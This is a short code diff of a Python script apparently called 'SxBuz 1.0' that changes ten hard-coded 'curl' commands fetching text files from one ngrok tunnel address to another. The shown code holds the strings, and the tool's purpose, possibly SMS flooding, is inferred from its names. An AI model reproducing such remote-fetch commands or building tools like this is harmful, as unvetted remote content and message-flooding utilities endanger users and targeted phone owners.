@@ -50,16 +50,16 @@ def hero():
     newperiod=period
     banner='figlet SxBuz 1.0|lolcat'
     numbers=[]
-    Commands='curl http://f988-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms.txt'
-    Commands1='curl http://f988-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms1.txt'
-    Commands2='curl http://f988-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms2.txt'
-    Commands3='curl http://f988-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms3.txt'
-    Commands4='curl http://f988-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms4.txt'
-    Commands5='curl http://f988-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms5.txt'
-    Commands6='curl http://f988-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms6.txt'
-    Commands7='curl http://f988-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms7.txt'
-    Commands8='curl http://f988-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms8.txt'
-    Commands9='curl http://f988-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms9.txt'
+    Commands='curl http://7206-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms.txt'
+    Commands1='curl http://7206-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms1.txt'
+    Commands2='curl http://7206-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms2.txt'
+    Commands3='curl http://7206-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms3.txt'
+    Commands4='curl http://7206-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms4.txt'
+    Commands5='curl http://7206-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms5.txt'
+    Commands6='curl http://7206-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms6.txt'
+    Commands7='curl http://7206-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms7.txt'
+    Commands8='curl http://7206-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms8.txt'
+    Commands9='curl http://7206-2401-4900-1687-7e82-ea3f-e7e0-7e64-5646.ngrok.io/ms9.txt'
 
     system(banner)
     print(f"{red}Contact me on telegram @smsn_knt")
